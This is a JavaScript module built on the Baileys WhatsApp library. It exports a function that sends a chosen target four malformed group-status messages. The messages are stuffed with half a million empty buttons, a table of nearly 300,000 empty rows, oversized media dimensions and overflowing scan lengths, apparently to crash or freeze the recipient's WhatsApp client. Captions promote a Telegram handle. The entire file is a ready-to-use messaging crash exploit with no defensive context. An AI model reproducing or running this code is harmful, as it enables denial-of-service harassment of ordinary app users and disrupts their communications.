const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    encodeSignedDeviceIdentity,
    processTime,
    fetchLatestBaileysVersion,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    patchMessageBeforeSending,
    encodeNewsletterMessage,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function android2(SYxS7, target) {
  const AXcrb = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
         header: {
        imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 9999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "@shahzu_404¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  },
   body: {
   text: "Telegram @shahzu_404 ¡!"
},
 nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
};

const yandex = generateWAMessageFromContent(target, AXcrb, {});

await SYxS7.relayMessage(target, yandex.message, {
  messageId: yandex.key.id
})

const CrBLLC = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 4,
                            tableMetadata: {
                                title: "Telegram @shahzu_404 ¡!",
                                rows: Array.from({ length: 299999 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "CRB"
                        },
                        forwardOrigin: 4
                    }
                }
            }
        }
    };

    const CrBLXC = generateWAMessageFromContent(target, CrBLLC, {});

    await SYxS7.relayMessage(target, CrBLXC.message, {
    messageId: CrBLXC.key.id
    });

  const iyoS = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
         header: {
        imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 9999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "@shahzu_404¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  },
   body: {
   text: "Nando Officiall ¡!"
},
 nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
};

const xxrre = generateWAMessageFromContent(target, iyoS, {});

await SYxS7.relayMessage(target, xxrre.message, {
  messageId: xxrre.key.id
})

const wysyaa = {
groupStatusMessageV2: {
message: {
interactiveMessage: {
header: {
title: "Telegram @shahzu_404",
hasMediaAttachment: true,
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
fileLength: 999999999,
pageCount: 1000,
mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
fileName: "nando.pdf",
fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
mediaKeyTimestamp: "1779839963",
thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
jpegThumbnail: null,
contextInfo: {},
thumbnailHeight: 999,
thumbnailWidth: 999
}
},
body: {
text: "Telegram @shahzu_404¡!",
},
nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
};

const prytyg = generateWAMessageFromContent(target, wysyaa, {});

await SYxS7.relayMessage(target, prytyg.message, {
messageId: prytyg.key.id
})
}




module.exports = { android2 };
